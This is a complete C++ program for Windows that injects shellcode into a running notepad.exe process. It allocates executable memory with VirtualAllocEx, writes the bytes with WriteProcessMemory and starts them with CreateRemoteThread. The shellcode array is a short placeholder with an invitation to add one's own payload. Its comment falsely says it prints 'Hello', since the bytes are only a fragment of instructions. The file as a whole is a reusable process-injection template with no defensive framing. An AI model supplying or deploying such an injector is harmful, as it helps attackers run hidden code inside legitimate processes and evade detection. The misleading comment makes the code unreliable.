#include <windows.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>

DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD processId = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W processEntry;
        processEntry.dwSize = sizeof(processEntry);
        
        if (Process32FirstW(snapshot, &processEntry)) {
            do {
                if (_wcsicmp(processEntry.szExeFile, processName) == 0) {
                    processId = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }
    return processId;
}

int main(int argc, char* argv[]) {
    // Example shellcode (prints "Hello")
    unsigned char shellcode[] = {
        0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10
        // Add your shellcode here
    };

    wchar_t processName[] = L"notepad.exe";
    DWORD processId = GetProcessIdByName(processName);
    
    if (!processId) {
        std::cout << "Process not found\n";
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        std::cout << "Failed to open process\n";
        return 1;
    }

    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess, 
        NULL, 
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!remoteBuffer) {
        std::cout << "Failed to allocate memory\n";
        CloseHandle(hProcess);
        return 1;
    }

    if (!WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL)) {
        std::cout << "Failed to write shellcode\n";
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteBuffer,
        NULL,
        0,
        NULL
    );

    if (!hThread) {
        std::cout << "Failed to create remote thread\n";
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    std::cout << "Injection successful\n";
    return 0;
}